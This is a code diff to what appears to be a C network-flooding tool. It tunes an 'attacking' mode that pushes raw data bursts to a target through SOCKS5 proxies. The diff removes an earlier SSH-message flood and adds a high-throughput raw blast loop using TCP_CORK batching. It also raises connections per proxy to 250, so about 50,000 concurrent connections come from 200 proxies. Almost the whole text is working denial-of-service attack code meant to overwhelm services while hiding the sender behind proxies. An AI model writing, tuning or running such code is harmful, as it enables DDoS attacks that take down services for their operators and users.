@@ -851,59 +851,32 @@ void handle_connection_event(int epoll_fd, struct epoll_event *ev, int thread_id
                 }
             }
             
-            else if (args.is_v15_raw_amp || args.is_vn_tcp) {
-                if (args.is_vn_tcp && conn->sub_stage == 0) {
-                    // Step1: SSH banner
-                    const char *ssh_banner = "SSH-2.0-OpenSSH_9.3p1 Ubuntu-1ubuntu3\r\n";
-                    send(conn->fd, ssh_banner, strlen(ssh_banner), MSG_NOSIGNAL);
-                    // Step2: minimal KEXINIT
-                    unsigned char kexinit[256];
-                    memset(kexinit, 0, sizeof(kexinit));
-                    kexinit[0]=0x00;kexinit[1]=0x00;kexinit[2]=0x00;kexinit[3]=0xEC;
-                    kexinit[4]=0x08;kexinit[5]=0x14;
-                    for(int ki=6;ki<22;ki++) kexinit[ki]=(unsigned char)(fast_rand()&0xFF);
-                    kexinit[22]=0x00;kexinit[23]=0x00;kexinit[24]=0x00;kexinit[25]=0x1F;
-                    memcpy(kexinit+26,"curve25519-sha256,diffie-hellman-group14-sha256",31);
-                    send(conn->fd, kexinit, sizeof(kexinit), MSG_NOSIGNAL);
-                    conn->sub_stage = 1;
-                    conn->last_pulse_ms = now;
-                }
+            else if (args.is_vn_tcp) {
+                // VN Raw Hex Blast — no SSH protocol, just raw data through SOCKS5 proxy
+                // MTU-safe: 1000-1440 bytes per send, maximize throughput
                 int ret = 0;
-                if (args.is_vn_tcp) {
-                    // SSH_MSG_IGNORE flood (RFC 4253 s11.2) - server MUST accept, no RST
-                    // Packet: [4B pkt_len][1B pad=6][1B type=2][4B str_len][32700B data][6B pad]
-                    #define VN_PL 32700
-                    #define VN_SZ (4+1+1+4+VN_PL+6)
-                    static __thread unsigned char vn_pkt[VN_SZ];
-                    static __thread int vn_ok = 0;
-                    if (!vn_ok) {
-                        uint32_t pl = 1+1+4+VN_PL+6;
-                        vn_pkt[0]=(pl>>24)&0xFF;vn_pkt[1]=(pl>>16)&0xFF;
-                        vn_pkt[2]=(pl>>8)&0xFF; vn_pkt[3]=pl&0xFF;
-                        vn_pkt[4]=6; vn_pkt[5]=2;
-                        vn_pkt[6]=(VN_PL>>24)&0xFF;vn_pkt[7]=(VN_PL>>16)&0xFF;
-                        vn_pkt[8]=(VN_PL>>8)&0xFF; vn_pkt[9]=VN_PL&0xFF;
-                        for(int pi=10;pi<VN_SZ;pi++) vn_pkt[pi]=(unsigned char)(fast_rand()&0xFF);
-                        vn_ok=1;
-                    }
-                    *((unsigned int*)(vn_pkt+10))=fast_rand();
-                    while(1) {
-                        ret=send(conn->fd,vn_pkt,VN_SZ,MSG_NOSIGNAL);
-                        if(ret<=0){if(errno==EAGAIN||errno==EWOULDBLOCK)conn->writable=0;break;}
-                        thread_stats[thread_id].packets++;
-                        thread_stats[thread_id].tcp_packets++;
-                        thread_stats[thread_id].bytes+=ret;
-                    }
-                } else {
-                    while(1) {
-                        int s=32768+(fast_rand()%32768);
-                        int offset=fast_rand()%(BUFFER_POOL_SIZE-s);
-                        ret=send(conn->fd,global_buffer_pool+offset,s,MSG_NOSIGNAL);
-                        if(ret<=0){if(errno==EAGAIN||errno==EWOULDBLOCK)conn->writable=0;break;}
-                        thread_stats[thread_id].packets++;
-                        thread_stats[thread_id].tcp_packets++;
-                        thread_stats[thread_id].bytes+=ret;
-                    }
+                while(1) {
+                    int s = 1000 + (fast_rand() % 440);  // 1000-1440 bytes
+                    int offset = fast_rand() % (BUFFER_POOL_SIZE - s);
+                    ret = send(conn->fd, global_buffer_pool + offset, s, MSG_NOSIGNAL);
+                    if(ret <= 0) { if(errno == EAGAIN || errno == EWOULDBLOCK) conn->writable = 0; break; }
+                    thread_stats[thread_id].packets++;
+                    thread_stats[thread_id].tcp_packets++;
+                    thread_stats[thread_id].bytes += ret;
+                }
+                if(ret <= 0 && errno != EAGAIN && errno != EWOULDBLOCK) goto cleanup;
+            }
+            
+            else if (args.is_v15_raw_amp) {
+                int ret = 0;
+                while(1) {
+                    int s=32768+(fast_rand()%32768);
+                    int offset=fast_rand()%(BUFFER_POOL_SIZE-s);
+                    ret=send(conn->fd,global_buffer_pool+offset,s,MSG_NOSIGNAL);
+                    if(ret<=0){if(errno==EAGAIN||errno==EWOULDBLOCK)conn->writable=0;break;}
+                    thread_stats[thread_id].packets++;
+                    thread_stats[thread_id].tcp_packets++;
+                    thread_stats[thread_id].bytes+=ret;
                 }
                 if(ret<=0 && errno!=EAGAIN && errno!=EWOULDBLOCK) goto cleanup;
             }
@@ -1019,7 +992,7 @@ static int get_total_active_conns() {
 static Proxy *select_alive_proxy() {
     if (proxy_count <= 0) return NULL;
     long long now = get_ms();
-    int max_conns = args.is_vn_tcp ? 50 : MAX_CONNS_PER_PROXY;
+    int max_conns = args.is_vn_tcp ? 250 : MAX_CONNS_PER_PROXY;
     int revival_ms = args.is_vn_tcp ? 3000 : 10000;
     for (int attempt = 0; attempt < 20; attempt++) {
         int idx = rand() % proxy_count;
@@ -1044,7 +1017,13 @@ static Proxy *select_alive_proxy() {
 }
 
 int spawn_connection(int epoll_fd, int thread_id) {
-    if (get_total_active_conns() >= args.rate) {
+    // VN method: cap at proxy_count * 250 (e.g. 200 proxy = 50000 conn)
+    int effective_rate = args.rate;
+    if (args.is_vn_tcp && proxy_count > 0) {
+        int vn_max = proxy_count * 250;
+        if (effective_rate > vn_max) effective_rate = vn_max;
+    }
+    if (get_total_active_conns() >= effective_rate) {
         return 0;
     }
     int fd = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
@@ -1132,7 +1111,7 @@ int spawn_connection(int epoll_fd, int thread_id) {
     conn->jitter_ms = (rand() % 15) - 7;
     conn->is_udp_assoc = is_udp;
     conn->client_udp_fd = -1;
-    if (!args.is_v15_raw_amp && !args.is_hybrid_v15) {
+    if (!args.is_v15_raw_amp && !args.is_hybrid_v15 && !args.is_vn_tcp) {
         generate_random_headers(conn->randomized_headers, conn->randomized_ua, args.host);
     }
 
@@ -2517,13 +2496,69 @@ void *worker_thread(void *arg) {
             }
         }
         
+        // Active TCP sending loop for VN Raw Blast — maximize throughput through VN proxies
+        if (args.is_vn_tcp) {
+            Connection *curr = active_conns_list;
+            while (curr) {
+                Connection *next_conn = curr->next;
+                if (curr->stage == STAGE_ATTACKING && curr->writable) {
+                    int cork = 1;
+                    setsockopt(curr->fd, IPPROTO_TCP, TCP_CORK, &cork, sizeof(cork));
+                    int ret;
+                    int batch_count = 0;
+                    while (batch_count < 64) {
+                        int s = 1000 + (fast_rand() % 440);  // 1000-1440 bytes MTU-safe
+                        int offset = fast_rand() % (BUFFER_POOL_SIZE - s);
+                        ret = send(curr->fd, global_buffer_pool + offset, s, MSG_NOSIGNAL | MSG_MORE);
+                        if (ret <= 0) {
+                            if (errno == EAGAIN || errno == EWOULDBLOCK) curr->writable = 0;
+                            break;
+                        }
+                        thread_stats[tid].packets++;
+                        thread_stats[tid].tcp_packets++;
+                        thread_stats[tid].bytes += ret;
+                        batch_count++;
+                    }
+                    cork = 0;
+                    setsockopt(curr->fd, IPPROTO_TCP, TCP_CORK, &cork, sizeof(cork));
+                    if (ret <= 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
+                        epoll_ctl(epoll_fd, EPOLL_CTL_DEL, curr->fd, NULL);
+                        thread_stats[tid].connect_fail++;
+                        if (curr->proxy) {
+                            __sync_fetch_and_add(&curr->proxy->fail_count, 1);
+                            curr->proxy->last_fail_time = now;
+                            if (curr->proxy->fail_count >= 30) curr->proxy->is_dead = 1;
+                            if (curr->proxy->active_conns > 0) {
+                                __sync_fetch_and_sub(&curr->proxy->active_conns, 1);
+                                __sync_fetch_and_sub(&global_proxy_active_conns, 1);
+                            }
+                        } else {
+                            if (global_active_conns > 0) __sync_fetch_and_sub(&global_active_conns, 1);
+                        }
+                        if (curr->fd > 0) close(curr->fd);
+                        if (curr->client_udp_fd > 0) close(curr->client_udp_fd);
+                        if (curr->prev) { curr->prev->next = curr->next; }
+                        else { active_conns_list = curr->next; }
+                        if (curr->next) { curr->next->prev = curr->prev; }
+                        free(curr);
+                    }
+                }
+                curr = next_conn;
+            }
+        }
+        
+        int eff_rate = args.rate;
+        if (args.is_vn_tcp && proxy_count > 0) {
+            int vn_max = proxy_count * 250;
+            if (eff_rate > vn_max) eff_rate = vn_max;
+        }
         int total = get_total_active_conns();
-        if (total < args.rate) {
-            int batch = (args.rate - total);
+        if (total < eff_rate) {
+            int batch = (eff_rate - total);
             int max_refill = args.is_vn_tcp ? 512 : 32;
             if (batch > max_refill) batch = max_refill;
             for (int b = 0; b < batch; b++) {
-                if (get_total_active_conns() >= args.rate) break;
+                if (get_total_active_conns() >= eff_rate) break;
                 spawn_connection(epoll_fd, tid);
             }
         }
